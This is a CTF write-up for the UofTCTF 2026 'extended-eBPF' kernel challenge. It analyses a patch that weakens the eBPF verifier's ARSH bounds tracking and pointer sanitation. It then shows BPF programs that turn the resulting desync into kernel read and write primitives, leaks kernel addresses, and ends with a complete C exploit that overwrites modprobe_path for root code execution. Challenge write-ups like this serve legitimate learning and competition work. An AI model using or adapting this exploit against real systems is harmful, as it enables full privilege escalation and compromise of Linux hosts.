---
layout: post
title: "UofTCTF 2026 - extended-eBPF"
date: 2026-04-20
categories: [meta]
---

## Challenge Overview

The challenge is a kernel PWN with some patches applied to the code related to eBPF:

```diff
diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c
index 24ae8f33e5d7..e5641845ecc0 100644
--- a/kernel/bpf/verifier.c
+++ b/kernel/bpf/verifier.c
@@ -13030,7 +13030,7 @@ static int retrieve_ptr_limit(const struct bpf_reg_state *ptr_reg,
 static bool can_skip_alu_sanitation(const struct bpf_verifier_env *env,
 				    const struct bpf_insn *insn)
 {
-	return env->bypass_spec_v1 || BPF_SRC(insn->code) == BPF_K;
+	return true;
 }
 
 static int update_alu_sanitation_state(struct bpf_insn_aux_data *aux,
@@ -14108,7 +14108,7 @@ static bool is_safe_to_compute_dst_reg_range(struct bpf_insn *insn,
 	case BPF_LSH:
 	case BPF_RSH:
 	case BPF_ARSH:
-		return (src_is_const && src_reg->umax_value < insn_bitness);
+		return (src_reg->umax_value < insn_bitness);
 	default:
 		return false;
 	}
```

The task is started using QEMU:

```bash
#!/bin/sh
exec qemu-system-x86_64 \
    -m 128M  \
    -smp 1 \
    -cpu qemu64,+smep,+smap \
    -kernel bzImage \
    -initrd initramfs.cpio.gz \
    -nographic \
    -monitor /dev/null \
    -no-reboot \
    -append "console=ttyS0 quiet kaslr panic=0 oops=panic"

```

We can see all the common mitigations (SMEP, SMAP, KASLR) are present.

## Analyzing the patch

Let's first focus on the second part:

```diff
 static int update_alu_sanitation_state(struct bpf_insn_aux_data *aux,
@@ -14108,7 +14108,7 @@ static bool is_safe_to_compute_dst_reg_range(struct bpf_insn *insn,
 	case BPF_LSH:
 	case BPF_RSH:
 	case BPF_ARSH:
-		return (src_is_const && src_reg->umax_value < insn_bitness);
+		return (src_reg->umax_value < insn_bitness);
 	default:
 		return false;
 	}
```

eBPF is basically a virtual machine that runs inside a Linux kernel. It has its own registers, and it can perform arithmetic operations like addition, subtraction, etc. One thing that stands out is that it's trying to ensure memory safety on pointer operations, e.g. it won't allow you to read memory above the stack. It does that by keeping min and max possible values for each register. The structure that holds this information can be found at [https://elixir.bootlin.com/linux/v6.12.47/source/include/linux/bpf_verifier.h#L75](https://elixir.bootlin.com/linux/v6.12.47/source/include/linux/bpf_verifier.h#L75)

```c
struct bpf_reg_state {
	/* Ordering of fields matters.  See states_equal() */
	enum bpf_reg_type type;
	/*
	 * Fixed part of pointer offset, pointer types only.
	 * Or constant delta between "linked" scalars with the same ID.
	 */
	s32 off;

  ...

	s64 smin_value; /* minimum possible (s64)value */
	s64 smax_value; /* maximum possible (s64)value */
	u64 umin_value; /* minimum possible (u64)value */
	u64 umax_value; /* maximum possible (u64)value */
	s32 s32_min_value; /* minimum possible (s32)value */
	s32 s32_max_value; /* maximum possible (s32)value */
	u32 u32_min_value; /* minimum possible (u32)value */
	u32 u32_max_value; /* maximum possible (u32)value */

  ...
};
```

The structure is internally a bit more complex, and holds more information, but we'll focus on these fields.
The second part of the patch is changing the condition under which verifier considers it safe to compute min and max values. If we follow the function call here [https://elixir.bootlin.com/linux/v6.12.47/source/kernel/bpf/verifier.c#L14131](https://elixir.bootlin.com/linux/v6.12.47/source/kernel/bpf/verifier.c#L14131), we get to [__mark_reg_unbounded](https://elixir.bootlin.com/linux/v6.12.47/source/kernel/bpf/verifier.c#L1899) where it sets range to:

```c
static void __mark_reg_unbounded(struct bpf_reg_state *reg)
{
	reg->smin_value = S64_MIN;
	reg->smax_value = S64_MAX;
	reg->umin_value = 0;
	reg->umax_value = U64_MAX;

	reg->s32_min_value = S32_MIN;
	reg->s32_max_value = S32_MAX;
	reg->u32_min_value = 0;
	reg->u32_max_value = U32_MAX;
}
```

In other words, unsafe means it ranges from 0 to MAX_VALUE. Before the patch, verifier computed (min, max) range for ARSH(Arithmetic Right Shift) operation only if the register value was constant, which means `min == max`:

```c
	if (insn_bitness == 32) {
		if (tnum_subreg_is_const(src_reg->var_off)
		    && src_reg->s32_min_value == src_reg->s32_max_value
		    && src_reg->u32_min_value == src_reg->u32_max_value)
			src_is_const = true;
	} else {
		if (tnum_is_const(src_reg->var_off)
		    && src_reg->smin_value == src_reg->smax_value
		    && src_reg->umin_value == src_reg->umax_value)
			src_is_const = true;
	}
```

This means during computation of ARSH, this condition is crucial for the security of the whole operation, therefore we must look for the code that actually relies on this assumption. We can find it at [scalar_min_max_arsh](https://elixir.bootlin.com/linux/v6.12.47/source/kernel/bpf/verifier.c#L14050)

```c
static void scalar_min_max_arsh(struct bpf_reg_state *dst_reg,
				struct bpf_reg_state *src_reg)
{
	u64 umin_val = src_reg->umin_value;

	/* Upon reaching here, src_known is true and umax_val is equal
	 * to umin_val.
	 */
	dst_reg->smin_value >>= umin_val;
	dst_reg->smax_value >>= umin_val;

	dst_reg->var_off = tnum_arshift(dst_reg->var_off, umin_val, 64);

	/* blow away the dst_reg umin_value/umax_value and rely on
	 * dst_reg var_off to refine the result.
	 */
	dst_reg->umin_value = 0;
	dst_reg->umax_value = U64_MAX;

	/* Its not easy to operate on alu32 bounds here because it depends
	 * on bits being shifted in from upper 32-bits. Take easy way out
	 * and mark unbounded so we can recalculate later from tnum.
	 */
	__mark_reg32_unbounded(dst_reg);
	__update_reg_bounds(dst_reg);
}
```

The comment says "Upon reaching here, src_known is true and umax_val is equal to umin_val", which is exactly what we are looking for. Here, the verifier is thinking "if min == max, then I can use either of those values", which creates a desync between real register value, and (min, max) range kept by the verifier.

## Getting back to the first part of the patch

Before writing the exploit, let's revisit the first part of the patch:

```diff
diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c
index 24ae8f33e5d7..e5641845ecc0 100644
--- a/kernel/bpf/verifier.c
+++ b/kernel/bpf/verifier.c
@@ -13030,7 +13030,7 @@ static int retrieve_ptr_limit(const struct bpf_reg_state *ptr_reg,
 static bool can_skip_alu_sanitation(const struct bpf_verifier_env *env,
 				    const struct bpf_insn *insn)
 {
-	return env->bypass_spec_v1 || BPF_SRC(insn->code) == BPF_K;
+	return true;
 }
```

I didn't analyze that part very deeply, but according to my research, without this change, verifier would insert additional instructions before pointer addition operations, that would restrict the offset that is being added to the pointer.

```c
static int retrieve_ptr_limit(const struct bpf_reg_state *ptr_reg,
			      u32 *alu_limit, bool mask_to_left)
{
	u32 max = 0, ptr_limit = 0;

	switch (ptr_reg->type) {
	case PTR_TO_STACK:
		/* Offset 0 is out-of-bounds, but acceptable start for the
		 * left direction, see BPF_REG_FP. Also, unknown scalar
		 * offset where we would need to deal with min/max bounds is
		 * currently prohibited for unprivileged.
		 */
		max = MAX_BPF_STACK + mask_to_left;
		ptr_limit = -(ptr_reg->var_off.value + ptr_reg->off);
		break;
	case PTR_TO_MAP_VALUE:
		max = ptr_reg->map_ptr->value_size;
		ptr_limit = (mask_to_left ?
			     ptr_reg->smin_value :
			     ptr_reg->umax_value) + ptr_reg->off;
		break;
	default:
		return REASON_TYPE;
	}

	if (ptr_limit >= max)
		return REASON_LIMIT;
	*alu_limit = ptr_limit;
	return 0;
}
```

## Crafting arbitrary read/arbitrary write primitives

In order to craft some read/write primitives, we are going to create a BPF map. These are data structures that allow us to pass some data from userspace to a BPF program.

```c
static int bpf_create_map(uint32_t value_size) {
	union bpf_attr attr;
	memset(&attr, 0, sizeof(attr));
	attr.map_type = BPF_MAP_TYPE_ARRAY;
	attr.key_size = sizeof(uint32_t);
	attr.value_size = value_size;
	attr.max_entries = 1;
	return sys_bpf(BPF_MAP_CREATE, &attr);
}
```

this creates an array-type map, with one entry. We'll set the entry value to 1 using:

```c
static int bpf_map_update_elem(int fd, const void *key, const void *value) {
	union bpf_attr attr;
	memset(&attr, 0, sizeof(attr));
	attr.map_fd = fd;
	attr.key = (uint64_t)(uintptr_t)key;
	attr.value = (uint64_t)(uintptr_t)value;
	attr.flags = BPF_ANY;
	return sys_bpf(BPF_MAP_UPDATE_ELEM, &attr);
}
```

Now, our high-level plan would be (expressed in Python-like language):

```python
x = map[0]
x &= 1 # this makes verifier think x's range is (0, 1)
y = 1 # y range is (1, 1)
y >>= x
```

now, remember these lines:

```c
	u64 umin_val = src_reg->umin_value;

	/* Upon reaching here, src_known is true and umax_val is equal
	 * to umin_val.
	 */
	dst_reg->smin_value >>= umin_val;
	dst_reg->smax_value >>= umin_val;

```

`y` is our dst_reg, and `x` is our src_reg, so the range for `y` would be (1 >> 0, 1 >> 0) == (1, 1).
But what if value of `x` was 1? Then correct range should've been (1 >> 1, 1 >> 1) == (0, 0), and this is our desync between verifier and the actual value.
For convenience, let's flip `y`'s value from 0 to 1:

```python
y *= -1
y += 1
```

now, `y == 1`, but the verifier thinks its value is 0, i.e. its range is (0, 0). This is very useful, as now we can use `y` for arithmetic operations to get out of bounds, while the verifier would think the value doesn't change, as anything + 0 == 0. Let's write BPF program that uses this attack:

```c
uint64_t bpf_read_relative(uint64_t offset) {
		struct bpf_insn prog[] = {
			BPF_MOV64_IMM(BPF_REG_0, 0),
			BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -8),  // key = 0 at fp-8

			BPF_LD_MAP_FD(BPF_REG_1, input_fd),
			BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),           // R2 = fp
			BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),
			BPF_CALL_HELPER(BPF_FUNC_map_lookup_elem),

			BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1), 
			BPF_EXIT_INSN(),
			
			BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0),    // reg_6 = input
			BPF_ALU64_IMM(BPF_AND, BPF_REG_6, 0x1),
			BPF_MOV64_IMM(BPF_REG_8, 0x1),
			BPF_ALU64_REG(BPF_ARSH, BPF_REG_8, BPF_REG_6), // verifier thinks reg_8 == 1, while it's 0
			BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, -1),
			BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 1), // verifier thinks reg_8 == 0, while it's 1

			BPF_LD_IMM64_RAW(BPF_REG_9, 0, offset),
			BPF_ALU64_REG(BPF_MUL, BPF_REG_9, BPF_REG_8),

			BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_9), // data map value ptr
			BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_0, 0),
			
			// // write to output map
			BPF_LD_MAP_FD(BPF_REG_1, output_fd),
			BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),           // R2 = fp
			BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),
			BPF_CALL_HELPER(BPF_FUNC_map_lookup_elem),

			BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1), 
			BPF_EXIT_INSN(),

			BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_8, 0),
			BPF_MOV64_IMM(BPF_REG_0, 0),
			BPF_EXIT_INSN(),
		};

		int prog_fd = bpf_prog_load(prog, sizeof(prog) / sizeof(prog[0]));
		if (prog_fd < 0) {
			return 1;
		}

		if (setsockopt(sv[1], SOL_SOCKET, SO_ATTACH_BPF, &prog_fd, sizeof(prog_fd)) != 0) {
			perror("SO_ATTACH_BPF");
			return 1;
		}

		uint64_t input = 0x1;
		uint64_t key = 0;
		if (bpf_map_update_elem(input_fd, &key, &input) != 0) {
			perror("bpf_map_update_elem");
			return 1;
		}
		
		if (write(sv[0], "X", 1) != 1) {
			perror("write");
			return 1;
		}

		uint64_t out_value = 0x1234;
		if (bpf_map_lookup_elem(output_fd, &key, &out_value) != 0) {
			return -1;
		}

		close(prog_fd);

		return out_value;
}
```

First part is just reading value from the map:

```c
			BPF_MOV64_IMM(BPF_REG_0, 0),
			BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -8),  // key = 0 at fp-8

			BPF_LD_MAP_FD(BPF_REG_1, input_fd),
			BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),           // R2 = fp
			BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),
			BPF_CALL_HELPER(BPF_FUNC_map_lookup_elem),

			BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1), 
			BPF_EXIT_INSN(),
```

it involves pushing the map's key to the stack (R10 is a stack pointer), and calling the helper function that actually reads the value. BPF verifier requires user to check the output value, that's why the `BPF_JMP_IMM` is needed at the end. Next, we perform the desync, as explained before:

```c
			BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0),    // reg_6 = input
			BPF_ALU64_IMM(BPF_AND, BPF_REG_6, 0x1),
			BPF_MOV64_IMM(BPF_REG_8, 0x1),
			BPF_ALU64_REG(BPF_ARSH, BPF_REG_8, BPF_REG_6), // verifier thinks reg_8 == 1, while it's 0
			BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, -1),
			BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 1), // verifier thinks reg_8 == 0, while it's 1

			BPF_LD_IMM64_RAW(BPF_REG_9, 0, offset),
			BPF_ALU64_REG(BPF_MUL, BPF_REG_9, BPF_REG_8),

			BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_9), // data map value ptr
			BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_0, 0),
```

and as the last step, we write the value we just read to output map, which is the way of returning the value to userspace:

```c
			BPF_LD_MAP_FD(BPF_REG_1, output_fd),
			BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),           // R2 = fp
			BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),
			BPF_CALL_HELPER(BPF_FUNC_map_lookup_elem),

			BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1), 
			BPF_EXIT_INSN(),

			BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_8, 0),
			BPF_MOV64_IMM(BPF_REG_0, 0),
			BPF_EXIT_INSN(),
```

This allows us to read relative to the beginning of our array. BPF maps hold some metadata just before our data starts. We can use that to leak some useful pointers:

1. map's address
2. kernel base address

I've found those experimentally by poking around in pwndbg:

```c
	map_addr = bpf_read_relative(-16 * 8) + 0x88ull;
	printf("map_addr = 0x%lx\n", map_addr);

	uint64_t kernel_leak = bpf_read_relative(-0xf8);
	kernel_base = kernel_leak - 0xc1d9a0;
	if (kernel_base == 0 || (kernel_base & 0xfff)) {
		printf("[-] failed to leak kernel base\n");
		return 1;
	}
```

Knowing `map_addr`, we can implement arbitrary read using simple math:

```c
uint64_t bpf_read_absolute(uint64_t addr) {

	return bpf_read_relative(addr - map_addr);
}
```

relative/absolute write functions are implemented the same way.

## Getting the flag

We can finish the exploit by using standard modprobe technique:

```c
	uint64_t modprobe_path_addr = kernel_base + 0x10be1e0;
	printf("modprobe_path_addr = 0x%lx\n", modprobe_path_addr);

	// overwrite modprobe_path with "/tmp/pwn.sh"
	bpf_write_absolute(modprobe_path_addr, 0x6e77702f706d742full);
	bpf_write_absolute(modprobe_path_addr + 8, 0x68732e);


	FILE *f = fopen("/tmp/pwn.sh", "w");
	fprintf(f, "#!/bin/sh\nchmod 777 /flag\n");
	fclose(f);
	chmod("/tmp/pwn.sh", 0777);

	// trigger modprobe 
	system("echo -e '\\xff\\xff\\xff\\xff' > /tmp/fake && chmod +x /tmp/fake && /tmp/fake; true");
```

which lets us just Cat The Flag.

Full exploit:

```c
#define _GNU_SOURCE
#include <errno.h>
#include <linux/bpf.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <unistd.h>

uint64_t map_addr = 0;
uint64_t kernel_base = 0;
int sv[2];
int input_fd, output_fd;


static int sys_bpf(enum bpf_cmd cmd, union bpf_attr *attr) {
	return syscall(__NR_bpf, cmd, attr, sizeof(*attr));
}

static int bpf_create_map(uint32_t value_size) {
	union bpf_attr attr;
	memset(&attr, 0, sizeof(attr));
	attr.map_type = BPF_MAP_TYPE_ARRAY;
	attr.key_size = sizeof(uint32_t);
	attr.value_size = value_size;
	attr.max_entries = 1;
	return sys_bpf(BPF_MAP_CREATE, &attr);
}

static int bpf_map_update_elem(int fd, const void *key, const void *value) {
	union bpf_attr attr;
	memset(&attr, 0, sizeof(attr));
	attr.map_fd = fd;
	attr.key = (uint64_t)(uintptr_t)key;
	attr.value = (uint64_t)(uintptr_t)value;
	attr.flags = BPF_ANY;
	return sys_bpf(BPF_MAP_UPDATE_ELEM, &attr);
}

static int bpf_map_lookup_elem(int fd, const void *key, void *value) {
	union bpf_attr attr;
	memset(&attr, 0, sizeof(attr));
	attr.map_fd = fd;
	attr.key = (uint64_t)(uintptr_t)key;
	attr.value = (uint64_t)(uintptr_t)value;
	return sys_bpf(BPF_MAP_LOOKUP_ELEM, &attr);
}

static int bpf_prog_load(struct bpf_insn *insns, size_t insn_cnt) {
	char log_buf[64 * 1024];
	union bpf_attr attr;

	memset(&attr, 0, sizeof(attr));
	attr.prog_type = BPF_PROG_TYPE_SOCKET_FILTER;
	attr.insn_cnt = (uint32_t)insn_cnt;
	attr.insns = (uint64_t)(uintptr_t)insns;
	attr.license = (uint64_t)(uintptr_t)"GPL";
	attr.log_buf = (uint64_t)(uintptr_t)log_buf;
	attr.log_size = sizeof(log_buf);
	attr.log_level = 1;

	int fd = sys_bpf(BPF_PROG_LOAD, &attr);
	if (fd < 0) {
		fprintf(stderr, "BPF_PROG_LOAD failed: %s\n", strerror(errno));
		fprintf(stderr, "Verifier log:\n%s\n", log_buf);
	}
	return fd;
}

#define BPF_LD_IMM64_RAW(dst, src, imm_val)                                \
	((struct bpf_insn){                                                \
		.code = BPF_LD | BPF_DW | BPF_IMM,                          \
		.dst_reg = dst,                                             \
		.src_reg = src,                                             \
		.off = 0,                                                   \
		.imm = (uint32_t)(imm_val)                                  \
	}),                                                               \
	((struct bpf_insn){                                                \
		.code = 0, .dst_reg = 0, .src_reg = 0, .off = 0,             \
		.imm = (uint32_t)((uint64_t)(imm_val) >> 32)                 \
	})

#define BPF_LD_MAP_FD(dst, fd) BPF_LD_IMM64_RAW(dst, BPF_PSEUDO_MAP_FD, fd)

#define BPF_MOV64_IMM(dst, imm_val) \
	((struct bpf_insn){.code = BPF_ALU64 | BPF_MOV | BPF_K, .dst_reg = dst, .imm = imm_val})

#define BPF_MOV64_REG(dst, src) \
	((struct bpf_insn){.code = BPF_ALU64 | BPF_MOV | BPF_X, .dst_reg = dst, .src_reg = src})

#define BPF_ALU64_IMM(op, dst, imm_val) \
	((struct bpf_insn){.code = BPF_ALU64 | op | BPF_K, .dst_reg = dst, .imm = imm_val})

#define BPF_ALU64_REG(op, dst, src) \
	((struct bpf_insn){.code = BPF_ALU64 | op | BPF_X, .dst_reg = dst, .src_reg = src})

#define BPF_ST_MEM(sz, dst, off_val, imm_val) \
	((struct bpf_insn){.code = BPF_ST | sz | BPF_MEM, .dst_reg = dst, .off = off_val, .imm = imm_val})

#define BPF_STX_MEM(sz, dst, src, off_val) \
	((struct bpf_insn){.code = BPF_STX | sz | BPF_MEM, .dst_reg = dst, .src_reg = src, .off = off_val})

#define BPF_LDX_MEM(sz, dst, src, off_val) \
	((struct bpf_insn){.code = BPF_LDX | sz | BPF_MEM, .dst_reg = dst, .src_reg = src, .off = off_val})

#define BPF_JMP_IMM(op, dst, imm_val, off_val) \
	((struct bpf_insn){.code = BPF_JMP | op | BPF_K, .dst_reg = dst, .off = off_val, .imm = imm_val})

#define BPF_CALL_HELPER(id) \
	((struct bpf_insn){.code = BPF_JMP | BPF_CALL, .imm = id})

#define BPF_EXIT_INSN() \
	((struct bpf_insn){.code = BPF_JMP | BPF_EXIT})


uint64_t bpf_write_relative(uint64_t offset, uint64_t value) {
		struct bpf_insn prog[] = {
			BPF_MOV64_IMM(BPF_REG_0, 0),
			BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -8),  // key = 0 at fp-8

			BPF_LD_MAP_FD(BPF_REG_1, input_fd),
			BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),           // R2 = fp
			BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),
			BPF_CALL_HELPER(BPF_FUNC_map_lookup_elem),

			BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1), 
			BPF_EXIT_INSN(),
			
			BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0),    // reg_6 = input
			BPF_ALU64_IMM(BPF_AND, BPF_REG_6, 0x1),
			BPF_MOV64_IMM(BPF_REG_8, 0x1),
			BPF_ALU64_REG(BPF_ARSH, BPF_REG_8, BPF_REG_6), // verifier thinks reg_8 == 1, while it's 0
			BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, -1),
			BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 1), // verifier thinks reg_8 == 0, while it's 1

			BPF_LD_IMM64_RAW(BPF_REG_9, 0, offset),
			BPF_ALU64_REG(BPF_MUL, BPF_REG_9, BPF_REG_8),

			BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_9), // data map value ptr
			BPF_LD_IMM64_RAW(BPF_REG_8, 0, value),
			BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_8, 0),
			
			BPF_MOV64_IMM(BPF_REG_0, 0),
			BPF_EXIT_INSN(),
		};

		int prog_fd = bpf_prog_load(prog, sizeof(prog) / sizeof(prog[0]));
		if (prog_fd < 0) {
			return 1;
		}

		if (setsockopt(sv[1], SOL_SOCKET, SO_ATTACH_BPF, &prog_fd, sizeof(prog_fd)) != 0) {
			perror("SO_ATTACH_BPF");
			return 1;
		}

		uint64_t input = 0x1;
		uint64_t key = 0;
		if (bpf_map_update_elem(input_fd, &key, &input) != 0) {
			perror("bpf_map_update_elem");
			return 1;
		}
		
		if (write(sv[0], "X", 1) != 1) {
			perror("write");
			return 1;
		}

		close(prog_fd);
		return 0;
}

uint64_t bpf_write_absolute(uint64_t addr, uint64_t value) {

	return bpf_write_relative(addr - map_addr, value);
}

uint64_t bpf_read_relative(uint64_t offset) {
		struct bpf_insn prog[] = {
			BPF_MOV64_IMM(BPF_REG_0, 0),
			BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -8),  // key = 0 at fp-8

			BPF_LD_MAP_FD(BPF_REG_1, input_fd),
			BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),           // R2 = fp
			BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),
			BPF_CALL_HELPER(BPF_FUNC_map_lookup_elem),

			BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1), 
			BPF_EXIT_INSN(),
			
			BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0),    // reg_6 = input
			BPF_ALU64_IMM(BPF_AND, BPF_REG_6, 0x1),
			BPF_MOV64_IMM(BPF_REG_8, 0x1),
			BPF_ALU64_REG(BPF_ARSH, BPF_REG_8, BPF_REG_6), // verifier thinks reg_8 == 1, while it's 0
			BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, -1),
			BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 1), // verifier thinks reg_8 == 0, while it's 1

			BPF_LD_IMM64_RAW(BPF_REG_9, 0, offset),
			BPF_ALU64_REG(BPF_MUL, BPF_REG_9, BPF_REG_8),

			BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_9), // data map value ptr
			BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_0, 0),
			
			// // write to output map
			BPF_LD_MAP_FD(BPF_REG_1, output_fd),
			BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),           // R2 = fp
			BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),
			BPF_CALL_HELPER(BPF_FUNC_map_lookup_elem),

			BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1), 
			BPF_EXIT_INSN(),

			BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_8, 0),
			BPF_MOV64_IMM(BPF_REG_0, 0),
			BPF_EXIT_INSN(),
		};

		int prog_fd = bpf_prog_load(prog, sizeof(prog) / sizeof(prog[0]));
		if (prog_fd < 0) {
			return 1;
		}

		if (setsockopt(sv[1], SOL_SOCKET, SO_ATTACH_BPF, &prog_fd, sizeof(prog_fd)) != 0) {
			perror("SO_ATTACH_BPF");
			return 1;
		}

		uint64_t input = 0x1;
		uint64_t key = 0;
		if (bpf_map_update_elem(input_fd, &key, &input) != 0) {
			perror("bpf_map_update_elem");
			return 1;
		}
		
		if (write(sv[0], "X", 1) != 1) {
			perror("write");
			return 1;
		}

		uint64_t out_value = 0x1234;
		if (bpf_map_lookup_elem(output_fd, &key, &out_value) != 0) {
			return -1;
		}

		close(prog_fd);

		return out_value;
}

uint64_t bpf_read_absolute(uint64_t addr) {

	return bpf_read_relative(addr - map_addr);
}

int main(int argc, char **argv) {
	input_fd = bpf_create_map(sizeof(uint64_t));
	output_fd = bpf_create_map(sizeof(uint64_t));
	

	if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sv) != 0) {
		perror("socketpair");
		return 1;
	}

	uint64_t out_value = 0;
	
	map_addr = bpf_read_relative(-16 * 8) + 0x88ull;
	printf("map_addr = 0x%lx\n", map_addr);

	uint64_t kernel_leak = bpf_read_relative(-0xf8);
	kernel_base = kernel_leak - 0xc1d9a0;
	if (kernel_base == 0 || (kernel_base & 0xfff)) {
		printf("[-] failed to leak kernel base\n");
		return 1;
	}

	printf("kernel_base = 0x%lx\n", kernel_base);

	uint64_t modprobe_path_addr = kernel_base + 0x10be1e0;
	printf("modprobe_path_addr = 0x%lx\n", modprobe_path_addr);

	// overwrite modprobe_path with "/tmp/pwn.sh"
	bpf_write_absolute(modprobe_path_addr, 0x6e77702f706d742full);
	bpf_write_absolute(modprobe_path_addr + 8, 0x68732e);


	FILE *f = fopen("/tmp/pwn.sh", "w");
	fprintf(f, "#!/bin/sh\nchmod 777 /flag\n");
	fclose(f);
	chmod("/tmp/pwn.sh", 0777);

	// trigger modprobe 
	system("echo -e '\\xff\\xff\\xff\\xff' > /tmp/fake && chmod +x /tmp/fake && /tmp/fake; true");

	return 0;
}

```